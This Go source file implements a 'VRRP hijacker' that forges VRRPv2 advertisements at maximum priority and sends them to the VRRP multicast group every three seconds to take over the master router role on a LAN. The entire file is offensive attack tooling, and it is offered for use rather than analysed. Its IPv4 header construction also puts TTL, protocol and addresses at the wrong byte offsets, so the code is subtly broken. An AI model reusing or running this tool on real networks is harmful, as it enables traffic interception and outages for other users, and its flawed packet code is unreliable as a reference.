package vrrp

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"
)

const (
	vrrpTag      = "\x1b[35m[VRRP]\x1b[0m"
	sendInterval = 3 * time.Second
	vrrpMcast    = "224.0.0.18"
	vrrpProto    = 112
)

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Hijacker injects forged VRRPv2 advertisements to seize the master role.
type Hijacker struct {
	Interface string
	Group     int
	SourceIP  string
	VirtualIP string
	Auth      string
}

func (h *Hijacker) Run() error {
	iface, err := net.InterfaceByName(h.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", h.Interface, err)
	}
	src := net.ParseIP(h.SourceIP)
	if src == nil || src.To4() == nil {
		return fmt.Errorf("invalid --src %q", h.SourceIP)
	}
	vip := net.ParseIP(h.VirtualIP)
	if vip == nil || vip.To4() == nil {
		return fmt.Errorf("invalid --virtual-ip %q", h.VirtualIP)
	}
	if h.Group < 0 || h.Group > 255 {
		return fmt.Errorf("invalid --group %d (must be 0-255)", h.Group)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", h.Interface)
	}

	dstIP := net.ParseIP(vrrpMcast).To4()
	payload := buildVRRPAdvertisement(byte(h.Group), vip.To4(), h.Auth)
	frame := buildVRRPFrame(srcMAC, src.To4(), dstIP, payload)

	fmt.Printf("%s Start of VRRP injection. Interception of the master router role...\n", vrrpTag)
	fmt.Printf("%s Press Ctrl+C to stop.\n", vrrpTag)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", vrrpTag)
		os.Exit(0)
	}()

	ticker := time.NewTicker(sendInterval)
	defer ticker.Stop()

	if err := sock.Send(frame); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	for range ticker.C {
		if err := sock.Send(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
	}
	return nil
}

func buildVRRPAdvertisement(group byte, vip net.IP, auth string) []byte {
	authType := byte(0)
	authDataLen := 0
	if auth != "" {
		authType = 1
		authDataLen = 8
	}

	pktLen := 8 + 4 + authDataLen
	pkt := make([]byte, pktLen)
	pkt[0] = 0x21 // VRRPv2 advertisement
	pkt[1] = group
	pkt[2] = 255
	pkt[3] = 1
	pkt[4] = authType
	pkt[5] = 1
	copy(pkt[8:12], vip.To4())
	if authDataLen > 0 {
		copy(pkt[12:], padAuth(auth))
	}
	binary.BigEndian.PutUint16(pkt[6:8], vrrpChecksum(pkt))
	return pkt
}

func padAuth(s string) []byte {
	b := make([]byte, 8)
	copy(b, []byte(s))
	return b
}

func buildVRRPFrame(srcMAC net.HardwareAddr, srcIP, dstIP net.IP, payload []byte) []byte {
	ipLen := 20 + len(payload)
	frame := make([]byte, 14+ipLen)

	dstMAC := ipv4MulticastMAC(dstIP)
	copy(frame[0:6], dstMAC[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)

	frame[14] = 0x45
	binary.BigEndian.PutUint16(frame[16:18], uint16(ipLen))
	frame[18] = 255
	frame[19] = vrrpProto
	copy(frame[22:26], srcIP.To4())
	copy(frame[26:30], dstIP.To4())
	copy(frame[34:], payload)

	binary.BigEndian.PutUint16(frame[20:22], ipChecksum(frame[14:14+ipLen]))
	return frame
}

func vrrpChecksum(pkt []byte) uint16 {
	save := pkt[6]
	pkt[6] = 0
	pkt[7] = 0
	csum := ipChecksum(pkt)
	pkt[6] = save
	return csum
}

func ipv4MulticastMAC(ip net.IP) [6]byte {
	v4 := ip.To4()
	return [6]byte{0x01, 0x00, 0x5E, v4[1] & 0x7F, v4[2], v4[3]}
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
